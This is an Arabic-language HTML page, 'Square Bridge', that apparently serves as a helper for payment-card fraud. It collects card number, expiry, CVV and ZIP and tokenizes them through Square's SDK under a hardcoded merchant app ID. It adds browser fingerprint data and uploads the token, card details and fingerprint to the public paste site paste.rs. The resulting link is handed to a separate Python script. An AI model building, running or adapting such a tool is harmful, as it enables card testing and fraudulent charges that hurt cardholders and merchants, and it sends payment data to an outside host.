<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Square Bridge</title>
<script src="https://web.squarecdn.com/v1/square.js"></script>
<style>
  body { font-family: monospace; padding: 12px; background:#f7f7f7; }
  input, button { font-size: 16px; padding: 10px; width: 100%; margin: 6px 0; box-sizing: border-box; }
  button { background:#0066cc; color:#fff; border:none; border-radius:6px; }
  button:disabled { background:#999; }
  button.green { background:#0a7d2c; }
  pre { background:#fff; padding:10px; border:1px solid #ccc; overflow:auto; font-size:11px; max-height:400px; white-space:pre-wrap; }
  .log { background:#222; color:#0f0; padding:8px; font-size:11px; max-height:150px; overflow:auto; }
  .url { background:#fffbe6; border:2px solid #f0c000; padding:12px; font-size:14px; word-break:break-all; user-select:all; }
  h3 { margin-top: 20px; }
</style>
</head>
<body>

<h3>1) بيانات البطاقة</h3>
<input id="num" placeholder="رقم البطاقة" inputmode="numeric">
<input id="exp" placeholder="MM/YY (مثال: 08/29)" inputmode="numeric">
<input id="cvv" placeholder="CVV" inputmode="numeric">
<input id="zip" placeholder="ZIP" value="36092" inputmode="numeric">

<h3>2) توليد</h3>
<button id="go" disabled>جاري تحميل Square...</button>
<div id="card-container"></div>

<h3>3) النتيجة</h3>
<pre id="out">بانتظار...</pre>

<h3>4) رابط لـ Python (اضغط للنسخ)</h3>
<button id="copy" disabled>نسخ الرابط</button>
<div id="urlbox" class="url" style="display:none"></div>

<h3>سجل الأخطاء</h3>
<div class="log" id="log">...</div>

<script>
const APP_ID = "sq0idp-wGVapF8sNt9PLrdj5znuKA";
const LOC_ID = "LRBWS2ZYH9DE3";

const logEl = document.getElementById("log");
function log(msg) {
  console.log(msg);
  logEl.textContent = (new Date().toLocaleTimeString()) + " — " + msg + "\n" + logEl.textContent;
}

if (!window.Square) {
  log("✗ square.js لم يُحمّل — تحقق من الاتصال أو HTTPS");
} else {
  log("✓ square.js محمّل");
}

let payments, card;

(async () => {
  try {
    payments = Square.payments(APP_ID, LOC_ID);
    log("✓ Square.payments() نجح");
    card = await payments.card();
    log("✓ card() نجح");
    await card.attach("#card-container");
    log("✓ card.attach() نجح — النموذج جاهز");
    const btn = document.getElementById("go");
    btn.disabled = false;
    btn.textContent = "توليد cnon";
    document.getElementById("out").textContent = "أدخل البيانات واضغط توليد";
  } catch (e) {
    log("✗ خطأ في التهيئة: " + (e.message || e));
    document.getElementById("out").textContent = "ERROR: " + (e.message || e);
  }
})();

document.getElementById("go").onclick = async () => {
  const btn = document.getElementById("go");
  btn.disabled = true;
  btn.textContent = "جاري التوليد...";
  document.getElementById("out").textContent = "جارٍ التوليد...";

  try {
    const result = await card.tokenize();
    log("tokenize → status=" + result.status);

    if (result.status !== "OK") {
      document.getElementById("out").textContent =
        "فشل: " + JSON.stringify(result.errors || result, null, 2);
      btn.disabled = false;
      btn.textContent = "إعادة المحاولة";
      return;
    }

    const payload = {
      status: result.status,
      token: result.token,
      card: result.details,
      user_agent: navigator.userAgent,
      language: navigator.language,
      platform: navigator.platform,
      screen: [screen.width, screen.height],
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      tz_offset: new Date().getTimezoneOffset(),
      hardware_concurrency: navigator.hardwareConcurrency,
      device_memory: navigator.deviceMemory || null,
    };

    document.getElementById("out").textContent = JSON.stringify(payload, null, 2);
    log("✓ تم التوليد — جاري الرفع إلى paste.rs...");

    // ارفع تلقائياً إلى paste.rs
    const res = await fetch("https://paste.rs", {
      method: "POST",
      body: JSON.stringify(payload)
    });

    if (!res.ok) throw new Error("paste.rs HTTP " + res.status);

    const pasteUrl = (await res.text()).trim();
    log("✓ تم الرفع: " + pasteUrl);

    const urlbox = document.getElementById("urlbox");
    urlbox.style.display = "block";
    urlbox.textContent = pasteUrl;

    const cb = document.getElementById("copy");
    cb.disabled = false;
    cb.classList.add("green");
    cb.textContent = "نسخ الرابط";

  } catch (e) {
    log("✗ فشل الرفع: " + (e.message || e));
    document.getElementById("out").textContent += "\n\nرفع تلقائي فشل — انسخ JSON يدوياً";
  } finally {
    btn.disabled = false;
    btn.textContent = "توليد cnon";
  }
};

document.getElementById("copy").onclick = async () => {
  const txt = document.getElementById("urlbox").textContent;
  try {
    await navigator.clipboard.writeText(txt);
    alert("تم نسخ الرابط ✓\nالصقه في Python عند [5] >");
  } catch (e) {
    const range = document.createRange();
    range.selectNodeContents(document.getElementById("urlbox"));
    const sel = window.getSelection();
    sel.removeAllRanges();
    sel.addRange(range);
    alert("النص محدد — اضغط نسخ من القائمة");
  }
};
</script>
</body>
</html>
